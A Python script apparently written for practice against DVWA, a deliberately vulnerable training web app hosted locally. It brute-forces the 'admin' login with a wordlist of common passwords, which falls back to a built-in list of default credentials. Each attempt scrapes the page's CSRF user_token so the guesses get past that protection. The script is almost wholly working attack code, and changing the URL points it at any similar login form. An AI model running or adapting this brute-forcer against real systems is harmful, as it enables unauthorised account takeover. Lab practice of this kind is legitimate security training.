#!/bin/env python3
import requests
import time
import re

dvwa_url = "http://127.0.0.1:4280/login.php"  # change url to match yours
wordlist = "/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"  # change this to any file path you want

try:
    with open(wordlist, "r") as h:
        passwords = h.readlines()
        passwords = [password.strip() for password in passwords]
except:
    # in case no file found or doesn't haave read permssion
    passwords = ['root', 'toor', 'raspberry', 'dietpi', 'test', 'uploader', 'password', 'admin', 'administrator', 'marketing', '12345678', '1234', '12345', 'qwerty', 'webadmin', 'webmaster', 'maintenance', 'techsupport', 'letmein', 'logon', 'Passw@rd', 'alpine']


for password in passwords:
    with requests.Session() as session:
        r = session.get(dvwa_url)
        match = re.search(r"([0-9a-fA-F]{32})", r.text)  # Looking for 32 hexdigits (user_token value)
        if match:
            extracted_value = match.group(1)

        prop = session.post(dvwa_url, cookies=r.cookies, data={"username": "admin", "password": password, "Login": "Login", "user_token": extracted_value})

        if "CSRF token is incorrect" in prop.text:
            print("Could not fetch user_token")
            break
        print(f"[+] Trying {password} Aganist user Admin", end=" ")
        if "Login failed" in prop.text:
            print(f"--- FAILED | TRY AGAIN")
        else:
            print("--- Sucecss! | YAY!")
            print(f"LOGGIN WITH USERNAME: 'admin' AND PASSWORD: '{password}'")
            break
